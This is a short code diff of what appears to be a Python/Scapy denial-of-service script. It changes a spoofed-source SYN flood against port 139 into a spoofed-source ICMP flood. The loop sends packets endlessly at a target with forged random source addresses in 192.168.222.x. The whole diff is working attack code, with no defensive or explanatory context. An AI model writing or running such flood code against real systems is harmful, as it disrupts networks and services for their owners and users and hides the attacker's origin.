@@ -175,7 +175,7 @@ def spoofed_icmp_flood():
 
     def spoofed_flood():
         while True:
-            send(IP(src="192.168.222." + str(random.randint(2, 253)), dst=target) / TCP(dport=139, flags="S") / "random_payload", inter=0.000001, loop=1, count=100)
+            send(IP(src="192.168.222." + str(random.randint(2, 253)), dst=target) / ICMP() / "random_payload", inter=0.000001, loop=1, count=100)
 
     try:
         spoofed_flood()
